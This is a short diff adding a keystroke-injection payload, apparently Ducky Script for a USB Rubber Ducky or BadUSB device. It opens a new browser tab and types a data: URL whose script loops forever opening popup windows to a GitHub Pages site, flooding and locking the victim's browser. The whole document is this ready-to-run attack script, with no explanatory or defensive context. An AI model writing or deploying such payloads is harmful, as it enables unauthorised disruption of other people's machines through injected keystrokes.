@@ -1,0 +1,6 @@
+DELAY 500
+CTRL T
+DELAY 500
+STRING data:text/html, <script> while (true) {window.open("https://blobbythe3rd.github.io/", "myWindow", "width=400, height=300");}</script>
+DELAY 500
+ENTER
